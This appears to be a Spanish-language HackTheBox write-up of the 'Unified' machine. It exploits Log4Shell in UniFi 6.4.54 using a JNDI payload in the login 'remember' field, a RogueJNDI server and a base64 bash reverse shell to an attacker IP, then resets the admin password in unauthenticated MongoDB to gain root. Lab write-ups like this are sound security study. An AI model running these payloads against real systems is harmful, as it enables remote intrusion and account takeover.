Unified Machine

Explotación de la vulnerabilidad crítica Log4Shell (CVE-2021-44228) en UniFi Network Application 6.4.54 a través de inyección JNDI en el campo remember del login. Uso de RogueJNDI para obtener shell inversa y modificación directa de contraseñas en MongoDB para comprometer la cuenta root.

Escenario

CVE-2021-44228 — Log4Shell
Vulnerabilidad crítica en Apache Log4j 2.x que permite ejecución remota de código mediante inyección JNDI a través de cadenas de log controladas por el usuario. CVSS 10.0.

Unified es una máquina Linux del Starting Point de HackTheBox con IP 10.129.96.49. Ejecuta UniFi Network Application versión 6.4.54, que utiliza Log4j vulnerable. El campo remember en la petición de autenticación no sanitiza las expresiones JNDI, permitiendo carga de clases Java remotas.

Explotación — Log4Shell JNDI Injection

Interceptar la petición de login con Burp Suite y modificar el campo remember:

# Payload Log4Shell en el campo remember
POST /api/login HTTP/1.1
Host: 10.129.96.49:8443
Content-Type: application/json

{
  "username": "a",
  "password": "a",
  "remember": "${jndi:ldap://10.10.14.X:1389/o=tomcat}",
  "strict": true
}

Configurar y lanzar RogueJNDI para servir payload Java malicioso:

# Compilar y ejecutar RogueJNDI
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi && mvn package -q

# Payload: reverse shell en base64
echo 'bash -c bash$IFS-i>&/dev/tcp/10.10.14.X/4444<&1' | base64
YmFzaCAtYyBiYXNoJElGUy1pPiYvZGV2L3RjcC8xMC4xMC4xNC5YLzQ0NDQ8JjEK

java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,<BASE64>}|{base64,-d}|bash" \

Cadena de Ataque

Paso 1
Identificación de UniFi 6.4.54
Nmap y análisis del portal web revelan versión de UniFi 6.4.54, vulnerable a Log4Shell (CVE-2021-44228).
Paso 2
JNDI Injection en campo remember
El campo remember en la API de login refleja el valor en logs de Log4j, disparando la inyección JNDI con payload ${jndi:ldap://attacker/}.
Paso 3
RogueJNDI → Reverse Shell
Servidor JNDI malicioso sirve payload Java que ejecuta reverse shell. Acceso como usuario unifi.
Paso 4
MongoDB sin Auth → Admin Reset
MongoDB corre sin autenticación en puerto 27117. Se modifica el hash SHA-512 del administrador en la DB ace.
Paso 5
SSH como root → Root Flag
Login SSH con las credenciales del administrador de UniFi que son compartidas con root del sistema operativo.
